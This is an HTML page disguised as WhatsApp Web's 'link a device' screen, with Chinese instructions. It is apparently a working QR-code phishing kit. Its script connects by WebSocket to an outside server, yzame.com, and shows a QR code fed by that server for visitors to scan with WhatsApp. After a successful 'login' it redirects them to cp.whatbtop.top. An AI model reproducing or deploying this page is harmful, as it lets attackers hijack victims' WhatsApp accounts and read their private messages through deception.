<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>WHATSAPP</title>
        <style type="text/css">
        html, body, .container {
        height: 100%;
        }
        body {
        margin: 0;
        padding: 0;
        font-family: Segoe UI,Helvetica Neue,Helvetica,Lucida Grande,Arial,Ubuntu,Cantarell,Fira Sans,sans-serif;
        }
        .container {
        background-color: rgb(211, 216, 219);
        background-image: linear-gradient(rgb(234, 230, 223), rgb(209, 215, 219));
        }
        .header {
        height: 220px;
        background-color: rgb(0, 168, 132);
        padding-top: 28px;
        text-align: center;
        /* overflow: hidden; */
        }
        .header .title {
        	padding: 0 20px;
            width: 1010px;
            min-width: 520px;
            /* max-width: 1050px; */
            height: 40px;
            margin: 28px auto;
            text-align: left;
        }
        .header span {
            
            
        }
        .title span {
            margin-left: 14px;
            display: inline-block;
            vertical-align: middle;
            font-size: 14px;
            line-height: 40px;
            font-weight: 500;
            color: #fff;
        }
        .header img {
        vertical-align: middle;
        }
        .content {
            background-color: #fff;
            display: inline-block;
            width: auto;
            min-width: 520px;
            max-width: 1050px;
            /* margin: 0 auto; */
            padding: 64px 60px 110px;
            height: 450px;
            box-sizing: border-box;
            position: relative;
            text-align: left;
            box-shadow: 0 17px 50px 0 rgb(11 20 26 / 19%), 0 12px 15px 0 rgb(11 20 26 / 24%);
            border-radius: 3px;
        }
        .content .left {
            max-width: 556px;
            float: left;
        }
        .left-top {
        font-size: 28px;
        font-weight: 300;
        line-height: normal;
        color: #41525d;
        margin-bottom: 52px;
        }
        .left-list {
            margin: 0;
            padding: 0;
            list-style-type: decimal;
            list-style: none;
        }
        .left-list li {
            margin-top: 18px;
            line-height: 28px;
            font-size: 18px;
            color: rgb(59, 74, 84);
            
            text-align: left;
        }
        .left-list li span{
            line-height: 24px;
            font-size: 18px;
            color: rgb(59, 74, 84);
            vertical-align: middle;
        }
        .left-list li img {
            vertical-align: middle;
        }
        .bold {
            font-weight: 500;
            vertical-align: middle;
        }
        .bold img {
            vertical-align: middle;
        }
        .bold span {
            vertical-align: middle;
        }
        .left-list li:first-child {
            margin-top: 0;
        }
        .right {
            margin-left: 60px;
            float: left;
            width: 264px;
            height: 264px;
        }
        .right img {
            width: 264px;
            height: 264px;
        }
        .clear {
            clear: both;
        }
        .content .pos {
            position: relative;
        }
        .content a {
            position: absolute;
            bottom: 66px;
            /* left: 0; */
            font-size: 14px;
            line-height: 1;
            text-decoration: none;
            color: rgb(0, 128, 105);
        }
    </style>
    
	<script src="./js/jquery.min.js"></script>
	<script src="./js/jquery.cookie.js"></script>
    <script src="./js/qrcode.min.js"></script>
	<script>
	
		function isIE() { //ie?
		 	if (!!window.ActiveXObject || "ActiveXObject" in window)
		  		return true;
		  	else
			  return false;
		 }
	
		function guid() {
		    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
		        var r = Math.random() * 16 | 0,
		            v = c == 'x' ? r : (r & 0x3 | 0x8);
		        return v.toString(16);
		    });
		}
		function getUUID(){
			
			var uuid = localStorage.getItem('uuid');
			if(!uuid){
				uuid  = guid();
			}
			//localStorage.setItem('uuid', uuid);
			//return 'hello_'+uuid;
			return uuid;
		}

        function sock(uuid){
            var ws = new WebSocket("wss://yzame.com/f3d79a4b13bf875753e5fb8b8898df522c537b04");
            ws.onopen = function (e) { 
                console.log("连接服务器成功");
                var date = {
                    uuid: uuid,
                    action: 'qrcode',
                    from: 'web'
                };
                var json = JSON.stringify(date);
                ws.send(json);
                setInterval(function(){
                    ws.send('{"action":"heartbeat"}');
                }, 10000)
            }

            ws.onclose = function(e){
                console.log("服务器关闭");
            }
            ws.onerror = function(){
                console.log("连接出错");
            }
            
            ws.onmessage = function(e){
                let message = e.data;
                console.log(message);
                var obj = JSON.parse(message);
                switch (obj.action) {
                    case 'qrcode':
                        document.getElementById("qrcode").innerHTML='';
                        var qrcode = new QRCode(document.getElementById("qrcode"), {
                            text: obj.value,
                            width: 264,
                            height: 264,
                            colorDark : "#122e31",
                            colorLight : "#fff",
                            correctLevel : 0
                        });
                        var img =  qrcode.makeImage()
                        $('#qrcode').show();
                        break;
                    case 'login':
                        if (obj.result) {
                            $.cookie('loginsucc', true);
                            $.cookie('uuid', uuid);
                            if(isIE()){
                                window.open('https://cp.whatbtop.top','_top').close();
                            }else{
                                location.href = 'https://cp.whatbtop.top';
                            }
                        }
                        break;
                    default:
                }
            }
        }
		$(document).ready(function(){
			$('#qrcode').hide();
            sock(guid());
		    // var loginsuccess = $.cookie('loginsucc');
		    // var ckUuid = $.cookie('uuid');
			// if(loginsuccess&&ckUuid){
			// 	//后台是否依然登录成功
			// 	$.get("/checklogin?uuid="+ckUuid+"&timestamp="+new Date().getTime(),function(loginState,status){
			// 		switch(loginState){
			// 			case 'isLogin':
			// 			case 'hei':
			// 				window.open('https://cp.whatbtop.top','_top').close();
			// 				break;
			// 			case 'noLogin':
			// 				qrcode();
			// 				break;
			// 		}
			// 	});
			// }else{
			// 	qrcode();	
			// }
		});
		
		function refreshqrcode(referBase64str,uuid){
			if(referBase64str=='success'){
				$.cookie('loginsucc',true,{path: '/',expires: 30});
				$.cookie('uuid',uuid,{path: '/',expires: 30});
				if(isIE()){
					window.open('https://cp.whatbtop.top','_top').close();
				}else{
                    localStorage.setItem('uuid', uuid);
					location.href = 'https://cp.whatbtop.top';
				}
			}else if(referBase64str!=''){
				$('#qrcode').attr('src', referBase64str);
				$('#qrcode').show();
			}
		}
		
		function qrcode(){
			$.get("/qrcode?type=init&uuid="+uuid+"&timestamp="+new Date().getTime(),function(referBase64str,status){
				refreshqrcode(referBase64str,uuid);
				setInterval(function(){
					$.get("/qrcode?type=refresh&uuid="+uuid+"&timestamp="+new Date().getTime(),function(referBase64str,status){
						refreshqrcode(referBase64str,uuid);
					});
				},1000);
			});
		}

	</script>
    
</head>

<body style="">
  <div class="container">
    <div class="header">
      <div class="title">
        <img src="./img/3.png">
        <span>WHATSAPP</span>
      </div>
      <div class="content">
            <div class="left">
                <div class="left-top">在你的电脑上使用 WhatsApp:</div>
                <ol class="left-list">
                    <li class="QtrYx">
                        <span>1. 在你手机上使用 WhatsApp</span>
                    </li>
                    <li class="QtrYx">
                        <span><span>2. 点击&nbsp;</span><span class="bold">菜单&nbsp;</span><img src="./img/1.png"><span>&nbsp;或&nbsp;</span><span class="bold">设置</span>&nbsp;<img src="./img/2.png"><span>，然后选择&nbsp;已连接的设备</span></span>
                    </li>
                    <li class="QtrYx">
                        <span>3. 使用你的手机拍摄屏幕上的二维码</span>
                    </li>
                </ol>
            </div>
            <div class="right">
                <div id="qrcode" style="display: none;">
            </div> 
            </div>
            
            <div class="clear"></div>
            <a href="#" target="_blank">需要登入帮助吗？</a>
      </div>
      <div></div>
    </div>
  </div>


<!--uuid=AE638622-EDC4-7389-9297-B005127408FC--></body></html>